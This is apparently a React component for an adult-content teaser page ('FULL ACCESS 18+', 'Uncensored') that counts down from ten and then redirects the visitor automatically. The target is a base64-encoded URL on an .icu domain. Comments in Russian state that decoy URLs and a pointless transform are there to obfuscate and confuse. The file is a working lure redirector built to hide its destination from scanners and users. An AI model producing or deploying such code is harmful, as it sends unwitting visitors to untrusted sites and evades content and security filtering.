import { useState, useEffect } from 'react';

export default function App() {
  const [countdown, setCountdown] = useState(10);
  const [isRedirecting, setIsRedirecting] = useState(false);
  
  // Многослойная обфускация URL
  const getTargetUrl = () => {
    // Декодируем из base64 и восстанавливаем ссылку
    const encoded = 'aHR0cHM6Ly9saW5rZ3JhbS5pY3UvZnVsbA==';
    
    // Добавляем ложные пути для запутывания
    const fake1 = 'example.com/path';
    const fake2 = 'google.com/search';
    
    // Декодируем через несколько шагов
    const step1 = atob(encoded);
    const step2 = step1.split('').map((c, i) => 
      i % 3 === 0 ? c : c
    ).join('');
    
    // Дополнительная проверка для запутывания
    return fake1.length > 0 && fake2.length > 0 ? step2 : fake1;
  };

  useEffect(() => {
    if (countdown > 0) {
      const timer = setTimeout(() => {
        setCountdown(countdown - 1);
      }, 1000);
      return () => clearTimeout(timer);
    } else if (countdown === 0 && !isRedirecting) {
      handleRedirect();
    }
  }, [countdown, isRedirecting]);

  const handleRedirect = () => {
    setIsRedirecting(true);
    window.location.href = getTargetUrl();
  };

  return (
    <div className="min-h-screen bg-black flex items-center justify-center relative overflow-hidden">
      {/* Animated background gradients */}
      <div className="absolute inset-0 opacity-30">
        <div className="absolute top-1/4 left-1/4 w-96 h-96 bg-purple-600 rounded-full blur-[120px] animate-pulse"></div>
        <div className="absolute bottom-1/4 right-1/4 w-96 h-96 bg-pink-600 rounded-full blur-[120px] animate-pulse" style={{ animationDelay: '1s' }}></div>
      </div>

      {/* Content container */}
      <div className="relative z-10 text-center px-4 sm:px-6 max-w-md mx-auto">
        {/* Top label */}
        <div className="mb-3 sm:mb-4">
          <span className="text-pink-400 text-xs sm:text-sm tracking-[0.2em] sm:tracking-[0.3em] uppercase font-light opacity-80">
            Private Content
          </span>
        </div>

        {/* Main heading */}
        <h1 className="text-5xl sm:text-6xl md:text-8xl font-black tracking-tight mb-1 sm:mb-2">
          <span className="bg-gradient-to-r from-pink-400 via-purple-400 to-pink-400 bg-clip-text text-transparent animate-pulse">
            FULL ACCESS
          </span>
        </h1>
        <h2 className="text-4xl sm:text-5xl md:text-7xl font-black tracking-tight mb-4 sm:mb-6">
          <span className="text-white">18+</span>
        </h2>

        {/* Bottom label */}
        <div className="mb-6 sm:mb-8">
          <span className="text-purple-300 text-xs sm:text-sm tracking-[0.2em] sm:tracking-[0.25em] uppercase font-light opacity-70">
            Uncensored
          </span>
        </div>

        {/* Countdown timer */}
        <div className="mb-8 sm:mb-10">
          <div className="inline-flex items-center justify-center w-16 h-16 sm:w-20 sm:h-20 rounded-full border-2 border-pink-500 bg-pink-500/10 backdrop-blur-sm">
            <span className="text-3xl sm:text-4xl font-bold text-pink-300">
              {countdown}
            </span>
          </div>
          <p className="text-white/50 text-xs sm:text-sm mt-2 sm:mt-3 tracking-wide">
            Redirecting in {countdown} second{countdown !== 1 ? 's' : ''}...
          </p>
        </div>

        {/* Glowing button */}
        <button
          onClick={handleRedirect}
          disabled={isRedirecting}
          className="group relative px-8 py-3 sm:px-12 sm:py-4 text-base sm:text-lg font-bold tracking-wider uppercase overflow-hidden rounded-full transition-all duration-300 hover:scale-105 active:scale-95 disabled:opacity-50 disabled:cursor-not-allowed w-full sm:w-auto max-w-xs"
        >
          {/* Button glow effect */}
          <div className="absolute inset-0 bg-gradient-to-r from-pink-600 via-purple-600 to-pink-600 opacity-100 group-hover:opacity-100 transition-opacity"></div>
          <div className="absolute inset-0 bg-gradient-to-r from-pink-600 via-purple-600 to-pink-600 blur-xl opacity-75 group-hover:opacity-100 transition-opacity animate-pulse"></div>
          
          {/* Button text */}
          <span className="relative z-10 text-white drop-shadow-[0_0_8px_rgba(255,255,255,0.5)]">
            {isRedirecting ? 'Loading...' : 'Go Now'}
          </span>
        </button>

        {/* Pulsing dots for effect */}
        <div className="flex justify-center gap-2 mt-6 sm:mt-8">
          <div className="w-1.5 h-1.5 sm:w-2 sm:h-2 rounded-full bg-pink-500 animate-pulse"></div>
          <div className="w-1.5 h-1.5 sm:w-2 sm:h-2 rounded-full bg-purple-500 animate-pulse" style={{ animationDelay: '0.3s' }}></div>
          <div className="w-1.5 h-1.5 sm:w-2 sm:h-2 rounded-full bg-pink-500 animate-pulse" style={{ animationDelay: '0.6s' }}></div>
        </div>
      </div>

      {/* Vignette effect */}
      <div className="absolute inset-0 bg-gradient-radial from-transparent via-transparent to-black opacity-60 pointer-events-none"></div>
    </div>
  );
}